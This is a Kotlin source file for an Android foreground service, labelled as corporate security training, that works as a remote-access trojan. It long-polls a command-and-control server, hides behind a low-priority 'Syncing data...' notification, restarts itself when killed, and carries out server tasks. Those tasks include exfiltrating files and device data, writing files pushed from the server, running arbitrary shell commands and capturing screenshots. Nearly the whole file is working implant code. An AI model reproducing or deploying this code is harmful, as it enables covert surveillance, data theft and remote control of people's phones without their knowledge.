package com.securitydemo.systeminfo

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * TunnelService — maintains a persistent long-poll connection to the C2 server.
 *
 * FOR CORPORATE SECURITY TRAINING ONLY.
 *
 * How it works:
 * 1. Started as a foreground service (shows minimal "syncing" notification)
 * 2. Runs a loop in a background thread:
 *    - POSTs device info to /tunnel
 *    - Server holds connection open up to 30s (long-poll)
 *    - If server has a task, it responds immediately
 *    - Service processes the task and sends results back to /beacon
 *    - Loops immediately to reconnect
 * 3. Survives app being closed — runs until explicitly stopped or device killed
 *
 * Training point: A foreground service with a vague notification like
 * "Syncing data..." is almost never questioned by users.
 */
class TunnelService : Service() {

    companion object {
        private const val TAG = "TunnelService"
        private const val CHANNEL_ID = "sync_channel"
        private const val NOTIFICATION_ID = 1001

        fun start(context: Context) {
            val intent = Intent(context, TunnelService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    @Volatile
    private var running = false
    private var tunnelThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        Log.d(TAG, "TunnelService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            tunnelThread = Thread { tunnelLoop() }.also { it.start() }
        }
        return START_STICKY  // Restart if killed by system
    }

    override fun onDestroy() {
        running = false
        tunnelThread?.interrupt()
        Log.d(TAG, "TunnelService destroyed")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Tunnel loop ─────────────────────────────────
    private fun tunnelLoop() {
        val collector = DeviceDataCollector(applicationContext)
        val baseUrl = BuildConfig.BEACON_URL.replace("/beacon", "/tunnel")
        var consecutiveErrors = 0

        while (running) {
            try {
                // Build poll payload with basic device info
                val pollData = collector.collectBasic().toMutableMap()
                pollData["type"] = "tunnel_poll"

                // Long-poll the server
                val response = postJson(baseUrl, mapToJson(pollData))

                if (response != null) {
                    consecutiveErrors = 0
                    val json = JSONObject(response)
                    val task = json.optString("task", "")

                    if (task.isNotEmpty()) {
                        Log.d(TAG, "Tunnel received task: $task")
                        processTask(task, json, collector)
                    }
                    // No delay — immediately reconnect for next task
                } else {
                    consecutiveErrors++
                }

                // Save tunnel status
                val prefs = applicationContext.getSharedPreferences(
                    BeaconWorker.PREFS_NAME, Context.MODE_PRIVATE
                )
                prefs.edit()
                    .putLong(BeaconWorker.KEY_LAST_BEACON, System.currentTimeMillis())
                    .apply()

            } catch (e: InterruptedException) {
                break
            } catch (e: Exception) {
                Log.e(TAG, "Tunnel error: ${e.message}")
                consecutiveErrors++
            }

            // Back-off on errors: 2s, 4s, 8s, max 15s
            if (consecutiveErrors > 0) {
                val delay = minOf(2000L * (1 shl minOf(consecutiveErrors - 1, 3)), 15000L)
                try { Thread.sleep(delay) } catch (_: InterruptedException) { break }
            }
        }
    }

    private fun processTask(task: String, json: JSONObject, collector: DeviceDataCollector) {
        val taskData: Map<String, Any> = when (task) {
            "collect_full" -> collector.collectAll() + mapOf("type" to "task_response", "task" to task)
            "collect_apps" -> collector.getInstalledApps() + mapOf(
                "type" to "task_response", "task" to task,
                "timestamp" to System.currentTimeMillis()
            )
            "collect_network" -> collector.collectBasic() + mapOf(
                "type" to "task_response", "task" to task
            )
            "set_message" -> {
                val msg = json.optString("message", "")
                if (msg.isNotEmpty()) {
                    val prefs = applicationContext.getSharedPreferences(
                        BeaconWorker.PREFS_NAME, Context.MODE_PRIVATE
                    )
                    prefs.edit().putString(BeaconWorker.KEY_SERVER_MSG, msg).apply()
                }
                mapOf(
                    "type" to "task_ack", "task" to task,
                    "status" to "message_set",
                    "timestamp" to System.currentTimeMillis()
                )
            }
            "list_files" -> handleListFiles(json)
            "upload_file" -> handleUploadFile(json)
            "download_file" -> handleDownloadFile(json)
            "shell_command" -> handleShellCommand(json)
            "screenshot" -> handleScreenshot(json)
            else -> mapOf(
                "type" to "task_unknown", "task" to task,
                "timestamp" to System.currentTimeMillis()
            )
        }

        // Send results back via /beacon
        try {
            postJson(BuildConfig.BEACON_URL, mapToJson(taskData))
            Log.d(TAG, "Task response sent: $task")

            // Update beacon count
            val prefs = applicationContext.getSharedPreferences(
                BeaconWorker.PREFS_NAME, Context.MODE_PRIVATE
            )
            val count = prefs.getInt(BeaconWorker.KEY_BEACON_COUNT, 0) + 1
            prefs.edit().putInt(BeaconWorker.KEY_BEACON_COUNT, count).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send task response: ${e.message}")
        }
    }

    // ─── File operation handlers ─────────────────────
    private fun handleListFiles(json: JSONObject): Map<String, Any> {
        val path = json.optString("path", "/sdcard/")
        return try {
            val dir = java.io.File(path)
            if (!dir.exists()) {
                mapOf("type" to "task_response", "task" to "list_files",
                    "path" to path, "error" to "path not found")
            } else if (!dir.canRead()) {
                mapOf("type" to "task_response", "task" to "list_files",
                    "path" to path, "error" to "permission denied")
            } else {
                val files = (dir.listFiles() ?: emptyArray()).map { f ->
                    mapOf(
                        "name" to f.name,
                        "is_dir" to f.isDirectory,
                        "size" to f.length(),
                        "modified" to f.lastModified(),
                        "readable" to f.canRead()
                    )
                }.sortedWith(compareByDescending<Map<String, Any>> { it["is_dir"] as Boolean }
                    .thenBy { (it["name"] as String).lowercase() })
                mapOf(
                    "type" to "task_response", "task" to "list_files",
                    "path" to path,
                    "file_count" to files.size,
                    "files" to files,
                    "timestamp" to System.currentTimeMillis()
                )
            }
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "list_files",
                "path" to path, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleUploadFile(json: JSONObject): Map<String, Any> {
        val path = json.optString("path", "")
        if (path.isEmpty()) {
            return mapOf("type" to "task_response", "task" to "upload_file",
                "error" to "no path specified")
        }
        return try {
            val file = java.io.File(path)
            if (!file.exists()) {
                mapOf("type" to "task_response", "task" to "upload_file",
                    "path" to path, "error" to "file not found")
            } else if (!file.canRead()) {
                mapOf("type" to "task_response", "task" to "upload_file",
                    "path" to path, "error" to "permission denied")
            } else if (file.length() > 10 * 1024 * 1024) { // 10MB limit
                mapOf("type" to "task_response", "task" to "upload_file",
                    "path" to path, "error" to "file too large (>10MB)")
            } else {
                val bytes = file.readBytes()
                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val uploadUrl = BuildConfig.BEACON_URL.replace("/beacon", "/api/file_upload")
                val uploadPayload = JSONObject().apply {
                    put("filename", file.name)
                    put("path", path)
                    put("content", b64)
                    put("device", Build.MODEL)
                }.toString()
                postJson(uploadUrl, uploadPayload)
                Log.d(TAG, "File uploaded: $path (${bytes.size} bytes)")
                mapOf(
                    "type" to "task_response", "task" to "upload_file",
                    "path" to path, "filename" to file.name,
                    "size" to bytes.size,
                    "status" to "uploaded",
                    "timestamp" to System.currentTimeMillis()
                )
            }
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "upload_file",
                "path" to path, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleDownloadFile(json: JSONObject): Map<String, Any> {
        val destPath = json.optString("dest_path", "")
        val content = json.optString("content", "")
        val filename = json.optString("filename", "file")
        if (destPath.isEmpty() || content.isEmpty()) {
            return mapOf("type" to "task_response", "task" to "download_file",
                "error" to "missing dest_path or content")
        }
        return try {
            val bytes = android.util.Base64.decode(content, android.util.Base64.DEFAULT)
            val file = java.io.File(destPath)
            file.parentFile?.mkdirs()
            file.writeBytes(bytes)
            Log.d(TAG, "File saved: $destPath (${bytes.size} bytes)")
            mapOf(
                "type" to "task_response", "task" to "download_file",
                "dest_path" to destPath, "filename" to filename,
                "size" to bytes.size,
                "status" to "saved",
                "timestamp" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "download_file",
                "dest_path" to destPath, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleShellCommand(json: JSONObject): Map<String, Any> {
        val command = json.optString("command", "")
        if (command.isEmpty()) {
            return mapOf("type" to "task_response", "task" to "shell_command",
                "error" to "empty command")
        }
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val stdout = process.inputStream.bufferedReader().readText()
            val stderr = process.errorStream.bufferedReader().readText()
            val exitCode = process.waitFor()
            mapOf(
                "type" to "task_response", "task" to "shell_command",
                "command" to command,
                "stdout" to stdout,
                "stderr" to stderr,
                "exit_code" to exitCode,
                "timestamp" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "shell_command",
                "command" to command, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleScreenshot(json: JSONObject): Map<String, Any> {
        val quality = json.optInt("quality", 40)
        val uploadUrl = BuildConfig.BEACON_URL.replace("/beacon", "/api/screen_upload")
        return ScreenCaptureService.captureAndUpload(quality, uploadUrl)
    }

    // ─── HTTP helpers ────────────────────────────────
    private fun postJson(urlStr: String, payload: String): String? {
        val url = URL(urlStr)
        val conn = url.openConnection() as HttpURLConnection
        try {
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "SystemInfo/1.0")
            conn.doOutput = true
            conn.doInput = true
            conn.connectTimeout = 15_000
            conn.readTimeout = 35_000  // 35s > 30s server hold time

            OutputStreamWriter(conn.outputStream).use {
                it.write(payload)
                it.flush()
            }

            return if (conn.responseCode == 200) {
                BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }
            } else null
        } finally {
            conn.disconnect()
        }
    }

    private fun mapToJson(map: Map<String, Any>): String {
        val json = JSONObject()
        for ((key, value) in map) {
            when (value) {
                is List<*> -> {
                    val arr = org.json.JSONArray()
                    for (item in value) {
                        if (item is Map<*, *>) {
                            val obj = JSONObject()
                            for ((k, v) in item) obj.put(k.toString(), v)
                            arr.put(obj)
                        } else arr.put(item)
                    }
                    json.put(key, arr)
                }
                is Map<*, *> -> {
                    val obj = JSONObject()
                    for ((k, v) in value) obj.put(k.toString(), v)
                    json.put(key, obj)
                }
                else -> json.put(key, value)
            }
        }
        return json.toString()
    }

    // ─── Notification ────────────────────────────────
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Data Sync",
                NotificationManager.IMPORTANCE_LOW  // No sound, minimal visibility
            ).apply {
                description = "Keeps system info synchronized"
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Info")
            .setContentText("Syncing data...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
